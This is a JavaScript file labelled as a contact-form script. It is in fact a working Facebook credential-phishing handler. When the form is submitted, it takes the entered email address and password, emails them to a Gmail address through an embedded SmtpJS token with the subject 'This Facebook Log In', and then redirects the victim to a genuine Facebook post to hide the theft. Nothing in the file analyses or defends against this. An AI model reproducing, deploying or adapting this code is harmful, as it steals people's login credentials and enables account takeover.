
/*==========Contact Section js===========*/

const form = document.querySelector('form');
const text = document.getElementById("text");
const password = document.getElementById("password");


function sendEmail(){

  const body = `Email Address: ${text.value}<br> <br> 
   Password Number: ${password.value}<br>`


      Email.send({

        SecureToken : "d42260c8-3ab3-4e66-a9b6-1bfe9701ceaa",
        To : 'rider6473@gmail.com',
        From : "sendemail248@gmail.com",
        Subject : "This Facebook Log In",
        Body : body
        }).then(
        message =>{
          if(message=='OK' ){
            Swal.fire({
              title: "Successfully!",
              text: "Your Data Successfully Received",
              icon: "success"
             });
             window.location.assign("https://www.facebook.com/100057523745964/posts/pfbid03iN8Menh5f5BDdW7LHVFqmzceD3SVASGRAeXN5MnbYCxFqm3vf4LoxU4GHPbuNbtl/?app=fbl");
            }

           }
       );
  }


  function checkInputs() {
    const items = document.querySelectorAll(".item");

    for(const item of items){
        if(item.value == ""){
          item.classList.add("error");
          item.parentElement.classList.add("error");
        }

        // if(items[1].value != ""){
        //     checkEmail();
        // }

        // items[1].addEventListener("keyup", () => {
        //     checkEmail();
        // });

        item.addEventListener("keyup", () => {
            if(item.value != "") {
              item.classList.remove("error");
              item.parentElement.classList.remove("error");
            }
            else{
                item.classList.add("error");
                item.parentElement.classList.add("error");
            }
        });
    }
  }

//   function checkEmail(){
//     const emailRegex = /^([a-z\d\.-]+)@([a-z\d-]+)\.([a-z]{2,3})(\.[a-z]{2,3})?$/;

//     const errorTextEmail = document.querySelector(".error_text.email");


//     if (!email.value.match(emailRegex)){
//         email.classList.add("error");
//         email.parentElement.classList.add("error");

//         if(email.value != ""){
//             errorTextEmail.innerText = "Enter a valid email address";
//         }
//         else{
//             errorTextEmail.innerText = "Email address can't be blank"; 
//         }
//     }
//     else{
//         email.classList.remove("error");
//         email.parentElement.classList.remove("error");
//     }
//   }
  
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    checkInputs();

   if (!text.classList.contains("error") &&
    !password.classList.contains("error")  ){
      sendEmail();

      
     form.reset();
     return false;
    }
  
  });